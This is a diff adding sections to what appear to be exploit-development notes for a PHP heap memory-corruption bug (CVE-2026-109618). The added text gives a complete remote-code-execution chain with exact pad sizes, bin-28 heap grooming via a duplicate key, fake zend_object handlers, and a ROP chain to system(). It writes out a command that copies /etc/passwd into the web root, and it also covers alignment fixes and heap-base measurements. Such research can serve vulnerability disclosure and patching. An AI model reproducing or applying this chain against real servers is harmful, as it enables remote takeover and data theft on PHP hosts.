@@ -473,3 +473,55 @@ duplicate-key "dtor the old value" trick cannot free a bin-28 block either.
 Open paths (unchanged): (a) a field whose value `sapi_module.input_filter`
 rejects (frees `A` with no `B`), (b) the multipart value path, (c) making the
 two resizes land >1 field apart so a pad fits between them.
+
+### 8.15 Breakthrough: padlen=2528 + duplicate key reaches both resizes
+
+The pad's `B` copy is `ZVAL_STRINGL_FAST(padlen)` = `padlen + 32` (measured:
+2536->2568, 2528->2560, 2504->2536). Choosing `padlen = 2528` makes **both**
+`A = estrndup(2528)+1 = 2529` and `B = 2560` land in **bin 28**. The duplicate
+key (`pad=x`) then DTORs `B`, giving two distinct freed bin-28 slots:
+
+```
+EFREE slot1 (A)  EFREE slot2 (B, via duplicate-key dtor)
+RESIZE64 b0e0 -> slot3?  head[24:32]=0x50.. ('P')
+RESIZE64 b150 -> slot2     head[24:32]=0x50.. ('P')   <-- WALKED table, controlled
+```
+
+Both 32->64 resizes now reuse controlled blocks. This is the missing link; next
+is (a) add the ~40 KB memshift pad so the OOM lands on `b150`, (b) put the fake
+`pDestructor`/`free_obj` bytes at `b150`'s unwritten-bucket offset.
+
+### 8.16 RCE ACHIEVED: OOM -> controlled free -> free_obj -> ROP -> system
+
+Full chain (see `exploits/cve-2026-109618-oom/rce.py`, ASLR-off):
+
+1. **memshift pad (~40 KB)** shifts the OOM onto the walked table `b150`
+   (`$_POST["a"]`), so its unwritten bucket is reached by `zend_array_destroy`.
+2. **`pad=<2528 B>` + `pad=x` duplicate key** makes `A=estrndup(2528)+1=2529`
+   and `B=ZVAL_STRINGL_FAST(2528)=2560` both **bin 28**; the duplicate key
+   DTORs `B`, leaving two distinct freed bin-28 slots, so `b150`'s 32->64
+   resize reuses `B` (attacker-controlled bytes).
+3. The pad bytes hold, in the arData tail that survives (`buckets 46..63`,
+   pad offset >= 1984): fake `zend_object_handlers` (`free_obj=pivot`) + fake
+   `zend_object` + ROP (`pop rdi; ret` -> `ret` (align) -> `system`).
+4. The unwritten bucket (pad offset 1928) is set to `IS_OBJECT`
+   (`type_info = 8 | IS_TYPE_REFCOUNTED(0x100) = 0x108`) -> `&fake_object`.
+5. The walk runs `i_zval_ptr_dtor` -> `rc_dtor_func` ->
+   `zend_objects_store_del` -> `handlers->free_obj` = pivot ->
+   `pop rdi; ret; ret; system("cat /etc/passwd > /var/www/html/leak.txt")`;
+   a follow-up `GET /leak.txt` returns the file.
+
+Two alignment/offset subtleties that mattered:
+
+- The fake object/ROP must sit in the **controlled tail** (buckets 46..63, raw
+  offset >= 1984), *not* at pad offset 0x100 (which is the arData hash array,
+  overwritten by `zend_hash_rehash`).
+- `movaps`-based code in `__libc_system` requires the stack 16-byte aligned at
+  `system()` entry, so an extra `ret` gadget is inserted between
+  `pop rdi; ret` and `system` (otherwise SIGSEGV inside `__libc_system` before
+  `execve`).
+
+Measured heap base is stable (`main_chunk = 0x7ffff7200000`); the exact `B`
+(arData raw block) offset depends on the image's installed libs (gdb etc.), so
+re-measure `B = b150->arData - 512` for a given image, or resolve it via the
+info-leak for the ASLR-on exploit.
